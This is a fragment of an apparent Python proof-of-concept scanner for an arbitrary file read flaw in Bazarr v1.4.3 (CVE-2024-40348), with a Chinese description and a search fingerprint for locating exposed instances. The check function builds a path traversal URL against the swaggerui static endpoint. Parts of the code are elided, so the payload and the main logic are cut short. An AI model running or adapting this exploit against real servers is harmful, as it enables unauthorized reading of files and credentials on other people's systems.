"""
介绍：Bazaar v1.4.3 任意文件读取漏洞(CVE-2024-40348)
指纹：title="Bazarr"
"""
import argparse
import textwrap
...
def check(target, timeout=5):
    try:
        ...
        url = target.strip('/') + "/api/swaggerui/static/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F" \
...
def main():
    banner = """
        ...
        """
    print(banner)
    parse = argparse.ArgumentParser(description="Bazaar v1.4.3 任意文件读取漏洞(CVE-2024-40348)", formatter_class=argparse.RawDescriptionHelpFormatter,
